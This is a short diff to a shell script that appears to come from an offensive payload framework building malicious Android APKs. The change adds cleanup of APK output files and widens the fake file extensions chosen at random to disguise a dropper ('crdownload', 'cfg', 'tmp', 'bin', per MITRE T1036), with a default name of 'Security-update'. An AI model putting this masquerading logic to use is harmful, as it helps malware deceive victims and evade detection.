@@ -7587,6 +7587,7 @@ rm $IPATH/output/my-release-key.Keystore > /dev/null 2>&1
 rm $ApAcHe/index.html > /dev/null 2>&1
 rm $ApAcHe/index.html > /dev/null 2>&1
 rm $ApAcHe/$N4m.apk > /dev/null 2>&1
+rm $IPATH/output/.apk > /dev/null 2>&1
 clear
 cd $IPATH/
 
@@ -12328,10 +12329,19 @@ if [ -z "$rpath" ]; then rpath="%tmp%";fi
 if [ -z "$NaM" ]; then NaM="Security-update";fi
 
 
-## Random chose one fake extension for Masquerade dropper real extension 
-conv=$(cat /dev/urandom | tr -dc '1-2' | fold -w 1 | head -n 1)
+## Random chose one fake extension
+# to Masquerade the dropper real extension (MITRE T1036)
+index=$(cat /dev/urandom | tr -dc '1-4' | fold -w 1 | head -n 1)
 ## if $conv number output 'its small than' number 3 ...
-if [ "$conv" ">" "1" ]; then ext="crdownload"; else ext="cfg"; fi
+if [ "$index" = "1" ]; then
+   ext="crdownload"
+elif [ "$index" = "2" ]; then
+   ext="cfg"
+elif [ "$index" = "3" ]; then
+   ext="tmp"
+elif [ "$index" = "4" ]; then
+   ext="bin"
+fi
 
 
 # display final settings to user
